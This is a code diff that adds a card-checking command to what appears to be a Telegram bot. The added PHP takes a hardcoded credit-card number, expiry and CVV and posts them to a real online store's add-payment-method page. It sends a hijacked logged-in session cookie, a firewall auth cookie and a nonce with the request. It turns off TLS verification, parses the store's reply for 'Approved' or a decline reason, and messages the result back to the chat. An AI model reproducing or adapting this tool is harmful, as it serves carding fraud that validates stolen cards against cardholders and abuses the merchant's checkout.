@@ -471,6 +471,75 @@ fclose($fp);
 
 
 
+if (strpos($message, ".pr") === 0 || strpos($message, "!pr") === 0 || strpos($message, "/pr") === 0) {
+
+
+
+$lista = "5218071187489214|08|2028|796";
+
+//$lista = substr($message, 5);
+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = $i[2];
+$cvv   = $i[3];
+
+$headers = array();
+$headers[] = "Host:www.warfighterhemp.com";
+$headers[] = "cache-control: max-age=0";
+$headers[] = "upgrade-insecure-requests: 1";
+$headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
+$headers[] = "referer: https://www.warfighterhemp.com/my-account/add-payment-method/";
+$headers[] = "cookie: PHPSESSID=212fbc15f71bcc4c6523856b55168a5d";
+$headers[] = "cookie: sbjs_migrations=1418474375998%3D1";
+$headers[] = "cookie: sbjs_current_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
+$headers[] = "cookie: sbjs_first_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
+$headers[] = "cookie: sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
+$headers[] = "cookie: sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
+$headers[] = "cookie: sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36";
+$headers[] = "cookie: lepopup-onload-WFH-Age-Verification=ilovefamily";
+$headers[] = "cookie: undefined=hidden";
+$headers[] = "cookie: wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=gopejob932%7C1726371315%7CxKjbMc5CqommL6NpUYvaxW2XinH9aH8T3oBhkO0VEn2%7Cfc6213f501ed59e619311b5374589b256f79c09b60acbe170c0bddd8f2468dcc";
+$headers[] = "cookie: wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5553%7Cother%7Cread%7Cbbb2aaec203845433e4024dc542fe29c176ed4fe9b73c69eee1a8d24edce7b3c";
+$headers[] = "cookie: sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F";
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://www.warfighterhemp.com/my-account/add-payment-method/");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce=9c4b4d45c8&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+$response = curl_exec($ch);
+
+$result1 = (strpos($response, "Nice! New payment method added") !== false) ? "Approved" : trim(strip_tags(capture($response, '<ul class="woocommerce-error" role="alert">', '</ul>'))) ?? "An error occurred, please try again";
+
+$patron = "/failed: (.*)/";
+preg_match($patron, $result1, $matches);
+$respo = $matches[1];
+
+
+//echo "RESULT: $respo\n";
+
+//echo "$result1\n";
+
+if (empty($respo)) {
+    $respo = "La variable \$respo está vacía.";
+sendMessage($chat_id,$respo,$message_id);
+
+} else {
+//echo "RESULT: $respo\n";
+sendMessage($chat_id,$respo,$message_id);
+}
+
+ curl_close($ch);
+}
 
 
 
